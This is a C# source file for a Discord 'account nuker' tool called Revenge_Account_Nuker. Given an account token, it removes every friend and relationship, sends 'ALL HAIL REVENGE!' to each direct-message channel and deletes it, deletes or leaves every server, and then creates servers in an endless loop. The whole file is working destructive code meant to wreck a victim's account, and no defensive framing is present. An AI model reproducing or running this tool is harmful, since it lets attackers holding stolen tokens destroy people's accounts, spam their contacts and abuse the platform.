using System;
using System.Windows.Forms;
using Discord;

namespace Revenge_Account_Nuker
{
	public static class Nuker
	{
		public static void LoadToken(string Token)
		{
			try
			{
				Nuker.Client = new DiscordClient(Token, true);
			}
			catch (InvalidTokenException)
			{
				MessageBox.Show("Invalid Token!", "Error", MessageBoxButtons.OK);
				Application.Restart();
			}
		}

		public static void nuker()
		{
			foreach (Relationship instance in Nuker.Client.GetRelationships())
			{
				ulong Relationships = instance;
				try
				{
					Nuker.Client.RemoveRelationship(Relationships);
				}
				catch (DiscordHttpException)
				{
				}
				catch (RateLimitException)
				{
				}
			}
			foreach (DMChannel Dms in Nuker.Client.GetPrivateChannels())
			{
				try
				{
					Dms.SendMessage("ALL HAIL REVENGE!", false, null);
				}
				catch (DiscordHttpException)
				{
				}
				catch (RateLimitException)
				{
				}
				Dms.Delete();
			}
			foreach (PartialGuild Servers in Nuker.Client.GetGuilds(100U, 0UL))
			{
				try
				{
					Servers.Delete();
				}
				catch (DiscordHttpException)
				{
					try
					{
						Servers.Leave();
					}
					catch (DiscordHttpException)
					{
					}
					catch (RateLimitException)
					{
					}
				}
				catch (RateLimitException)
				{
				}
			}
			for (;;)
			{
				try
				{
					Nuker.Client.CreateGuild("ALL HAIL REVENGE!", null, null);
				}
				catch (DiscordHttpException)
				{
				}
				catch (RateLimitException)
				{
				}
			}
		}

		public static DiscordClient Client;
	}
}
